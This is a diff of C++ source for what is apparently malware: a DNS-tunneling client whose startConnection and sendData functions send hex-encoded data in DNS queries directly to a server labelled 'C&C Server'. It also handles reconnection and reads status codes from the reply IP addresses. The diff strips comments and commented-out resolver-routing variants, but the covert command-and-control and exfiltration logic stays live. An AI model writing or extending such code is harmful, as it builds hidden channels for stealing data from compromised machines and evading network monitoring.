@@ -35,9 +35,8 @@ int startConnection(const char* domain) {
 	WORD wType = DNS_TYPE_A;
 	PDNS_RECORD pDnsRecord = nullptr;
 	
-	// ==========================================
 	// LOCAL TEST MODE: Direct to C&C Server
-	// ==========================================
+
 	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
 	if (!pSrvList) {
 		return -1;
@@ -57,38 +56,6 @@ int startConnection(const char* domain) {
 	
 	LocalFree(pSrvList);
 	
-	// ==========================================
-	// PRODUCTION MODE (Future - commented out)
-	// ==========================================
-	// TODO: When using DNS Resolver:
-	/*
-	// Option 1: Use self-hosted DNS Resolver
-	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
-	if (pSrvList) {
-		pSrvList->AddrCount = 1;
-		pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);  // DNS Resolver IP
-		
-		DNS_STATUS status = DnsQuery_A(
-			pOwnerName,
-			wType,
-			DNS_OPTIONS,
-			pSrvList,
-			&pDnsRecord,
-			nullptr
-		);
-		LocalFree(pSrvList);
-	}
-	
-	// Option 2: Use System DNS (domain must have correct NS records)
-	DNS_STATUS status = DnsQuery_A(
-		pOwnerName,
-		wType,
-		DNS_OPTIONS,
-		nullptr,  // Use system DNS
-		&pDnsRecord,
-		nullptr
-	);
-	*/
 	
 	if (status) {
 		return -1;
@@ -115,13 +82,6 @@ int startConnection(const char* domain) {
 
 /**
  * Send data via DNS tunneling
- * 
- * LOCAL TEST MODE:
- *   Sends directly to C&C server
- * 
- * PRODUCTION MODE (Future):
- *   Sends to DNS Resolver → Resolver forwards to C&C
- * 
  * Format: b.packetNum.connectionId.hexData.domain
  * Response IP first octet = status code
  */
@@ -138,9 +98,8 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 	WORD wType = DNS_TYPE_A;
 	PDNS_RECORD pDnsRecord = nullptr;
 	
-	// ==========================================
 	// LOCAL TEST MODE: Direct to C&C Server
-	// ==========================================
+	
 	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
 	if (!pSrvList) {
 		return -1;
@@ -165,31 +124,6 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 			nullptr
 		);
 		
-		// ==========================================
-		// PRODUCTION MODE (Future - commented out)
-		// ==========================================
-		// TODO: When using DNS Resolver, replace DnsQuery_A above with:
-		/*
-		// Use DNS Resolver
-		status = DnsQuery_A(
-			pOwnerName,
-			wType,
-			DNS_OPTIONS,
-			pSrvList,  // DNS Resolver IP
-			&pDnsRecord,
-			nullptr
-		);
-		
-		// Or use System DNS (if domain has NS records configured)
-		status = DnsQuery_A(
-			pOwnerName,
-			wType,
-			DNS_OPTIONS,
-			nullptr,  // System DNS
-			&pDnsRecord,
-			nullptr
-		);
-		*/
 		
 		if (!status && pDnsRecord) {
 			IN_ADDR ipaddr;
@@ -206,37 +140,37 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 			int code = std::stoi(ipStr.substr(0, firstDot));
 			
 			switch (code) {
-				case 200:  // OK - processed normally
+				case 200:  
 					retCode = 0;
 					goto cleanup;
 					
-				case 201:  // Malformed packet
+				case 201:  
 					break;
 					
-				case 202:  // Connection non-existent - need to reconnect
+				case 202: 
 					{
 						int new_id = startConnection(domain);
 						if (new_id != -1) {
 							id = new_id;
 						}
 					}
-					i--;  // Don't count this retry
+					i--;  
 					break;
 					
-				case 203:  // Out of order packets - reset
+				case 203:  
 					packetNumber = 0;
-					i--;  // Don't count this retry
+					i--;  
 					break;
 					
-				case 204:  // Max connections reached
+				case 204: 
 					goto cleanup;
 					
-				default:   // Unknown error
+				default:
 					goto cleanup;
 			}
 		}
 		
-		Sleep(200);  // Reduced from 500ms to 200ms
+		Sleep(200); 
 	}
 	
 cleanup:
